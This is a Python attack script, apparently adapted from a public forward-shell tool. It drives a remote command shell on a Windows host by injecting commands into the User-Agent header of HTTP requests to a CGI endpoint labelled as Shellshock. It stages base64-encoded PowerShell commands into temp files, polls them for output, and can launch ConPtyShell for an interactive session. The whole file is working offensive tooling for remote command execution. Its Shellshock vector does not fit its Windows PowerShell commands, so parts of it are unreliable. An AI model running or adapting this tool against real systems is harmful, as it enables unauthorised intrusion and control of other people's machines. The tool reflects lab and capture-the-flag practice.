#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Windows Forward Shell - Controller
# Adapted from IppSec & 0xdf's original forward-shell.py
# https://github.com/IppSec/forward-shell

import base64
import random
import requests
import threading
import time


class WebShell(object):

    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        # MODIFY THIS: target URL and exploit parameters
        self.url = r"http://10.10.10.56/cgi-bin/cat"
        self.proxies = {'http': proxies}
        session = random.randrange(10000, 99999)
        print(f"[*] Session ID: {session}")

        # Windows paths used by agent.ps1
        self.stdin  = r"C:\Windows\Temp\fwd_cmd.txt"
        self.stdout = r"C:\Windows\Temp\fwd_out.txt"
        self.interval = interval

        # Verify agent is running (initial no-op)
        print("[*] Checking agent availability")
        self.RunRawCmd('whoami', timeout=5)

        # Start read thread
        print("[*] Starting read thread")
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    def ReadThread(self):
        GetOutput = f'powershell -c "Get-Content -Path \'{self.stdout}\' -Raw -ErrorAction SilentlyContinue"'
        while True:
            result = self.RunRawCmd(GetOutput)
            if result and result.strip():
                print(result)
                ClearOutput = f'powershell -c "Clear-Content -Path \'{self.stdout}\' -ErrorAction SilentlyContinue"'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        # MODIFY THIS: payload delivery mechanism
        payload = cmd

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}

        # MODIFY THIS: exploit vector (User-Agent for Shellshock here)
        headers = {'User-Agent': payload}
        try:
            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except Exception:
            pass

    def WriteCmd(self, cmd):
        # Encode command as UTF-16LE Base64 (PowerShell prefers this)
        b64cmd = base64.b64encode(cmd.rstrip().encode('utf-16le')).decode('utf-8')
        # Stage: decode base64 and write to command file via PowerShell
        stage_cmd = (
            f'powershell -c "'
            f'[IO.File]::WriteAllText(\'{self.stdin}\', '
            f'[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'{b64cmd}\'))'
            f')"'
        )
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.2)

    def UpgradeShell(self):
        # Windows PTY upgrade is limited; attempt ConPtyShell if present
        UpgradeShell = (
            'powershell -c "'
            'if (Test-Path C:\\Windows\\Temp\\ConPtyShell.exe) '
            '{ Start-Process C:\\Windows\\Temp\\ConPtyShell.exe } else '
            '{ Write-Host \'ConPtyShell not found\' }"'
        )
        self.WriteCmd(UpgradeShell)


prompt = "Please Subscribe> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
